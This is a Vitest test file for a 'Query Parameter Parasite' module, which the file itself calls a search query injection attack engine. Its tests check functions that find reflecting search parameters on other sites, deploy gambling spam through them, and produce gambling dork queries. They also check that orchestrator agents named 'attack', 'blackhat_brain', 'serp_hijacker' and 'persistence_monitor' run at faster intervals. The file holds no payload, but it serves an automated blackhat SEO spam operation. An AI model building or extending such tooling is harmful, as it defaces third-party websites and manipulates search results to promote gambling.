/**
 * Query Parameter Parasite — Vitest Tests
 * Tests the new search query injection attack engine
 */
import { describe, it, expect, vi } from "vitest";

describe("Query Parameter Parasite — Engine", () => {
  it("should export all required functions", async () => {
    const mod = await import("./query-param-parasite");
    expect(typeof mod.scanForQueryReflection).toBe("function");
    expect(typeof mod.deployQueryParasite).toBe("function");
    expect(typeof mod.generateParasiteKeywords).toBe("function");
    expect(typeof mod.getQueryParasiteDorks).toBe("function");
    expect(typeof mod.runQueryParasiteCampaign).toBe("function");
    expect(typeof mod.queryParasiteTick).toBe("function");
  });

  it("getQueryParasiteDorks should return gambling-related dork queries", async () => {
    const { getQueryParasiteDorks } = await import("./query-param-parasite");
    const dorks = getQueryParasiteDorks();
    expect(Array.isArray(dorks)).toBe(true);
    expect(dorks.length).toBeGreaterThan(0);
    // All dorks should be strings
    for (const dork of dorks) {
      expect(typeof dork).toBe("string");
      expect(dork.length).toBeGreaterThan(0);
    }
    // Should contain inurl: patterns for query parameters
    const hasInurl = dorks.some(d => d.includes("inurl:"));
    expect(hasInurl).toBe(true);
  });

  it("queryParasiteTick should return zero results when no targets provided", async () => {
    const { queryParasiteTick } = await import("./query-param-parasite");
    const result = await queryParasiteTick(["สล็อต", "บาคาร่า"], []);
    expect(result.scanned).toBe(0);
    expect(result.vulnerable).toBe(0);
    expect(result.deployed).toBe(0);
    expect(result.indexed).toBe(0);
  });

  it("queryParasiteTick should return zero results when no keywords provided", async () => {
    const { queryParasiteTick } = await import("./query-param-parasite");
    // Empty keywords + empty targets = immediate return
    const result = await queryParasiteTick([], []);
    expect(result.scanned).toBe(0);
    expect(result.deployed).toBe(0);
  });
});

describe("Query Parameter Parasite — Orchestrator Integration", () => {
  it("should have query_parasite agent config in orchestrator", async () => {
    // Read the orchestrator source to verify query_parasite is registered
    const fs = await import("fs");
    const source = fs.readFileSync("./server/agentic-auto-orchestrator.ts", "utf-8");
    
    // Check agent config exists
    expect(source).toContain("query_parasite:");
    expect(source).toContain("query_parasite_tick");
    expect(source).toContain("executeQueryParasiteTask");
    expect(source).toContain('registerExecutor("query_parasite_tick"');
  });

  it("should have accelerated intervals for all agents (1-3 day target)", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("./server/agentic-auto-orchestrator.ts", "utf-8");
    
    // Attack should be 30 min (was 1h)
    expect(source).toContain("attack: {\n    enabled: true, intervalMs: 30 * 60 * 1000, maxConcurrent: 2");
    
    // SERP harvester should be 1h (was 2h)
    expect(source).toContain("serp_harvester: {\n    enabled: true, intervalMs: 1 * 60 * 60 * 1000");
    
    // Query parasite should be 1h
    expect(source).toContain("query_parasite: {\n    enabled: true, intervalMs: 1 * 60 * 60 * 1000");
    
    // CMS scan should be 1h (was 2h)
    expect(source).toContain("cms_scan: {\n    enabled: true, intervalMs: 1 * 60 * 60 * 1000, maxConcurrent: 2");
  });

  it("should have recovery strategies for query_parasite", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("./server/agentic-auto-orchestrator.ts", "utf-8");
    
    expect(source).toContain("increase_parasite_interval");
    expect(source).toContain("reduce_parasite_scope");
    expect(source).toContain("pause_query_parasite");
  });
});

describe("Query Parameter Parasite — Router", () => {
  it("should have all required endpoints in the router", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("./server/routers/query-parasite.ts", "utf-8");
    
    // Check all endpoints exist
    expect(source).toContain("scan:");
    expect(source).toContain("deploy:");
    expect(source).toContain("runCampaign:");
    expect(source).toContain("getDorks:");
    expect(source).toContain("expandKeywords:");
    expect(source).toContain("tick:");
  });

  it("should be registered in the main appRouter", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("./server/routers.ts", "utf-8");
    
    expect(source).toContain('import { queryParasiteRouter }');
    expect(source).toContain("queryParasite: queryParasiteRouter");
  });
});

describe("Query Parameter Parasite — Background Daemon", () => {
  it("should have query_parasite_tick in daemon TaskType", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("./server/background-daemon.ts", "utf-8");
    
    expect(source).toContain("query_parasite_tick");
  });
});

describe("Accelerated Agent Intervals — Summary", () => {
  it("should have all 19 agents enabled", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("./server/agentic-auto-orchestrator.ts", "utf-8");
    
    const agentNames = [
      "attack", "seo", "scan", "research", "learning", "cve",
      "keyword_discovery", "gambling_brain", "cms_scan", "blackhat_brain",
      "sprint_engine", "ctr_engine", "freshness_engine", "gap_analyzer",
      "serp_hijacker", "serp_harvester", "content_distributor",
      "persistence_monitor", "query_parasite"
    ];
    
    for (const name of agentNames) {
      expect(source).toContain(`${name}: {`);
      // Each should be enabled
      const regex = new RegExp(`${name}:\\s*\\{\\s*enabled:\\s*true`);
      expect(source).toMatch(regex);
    }
  });
});
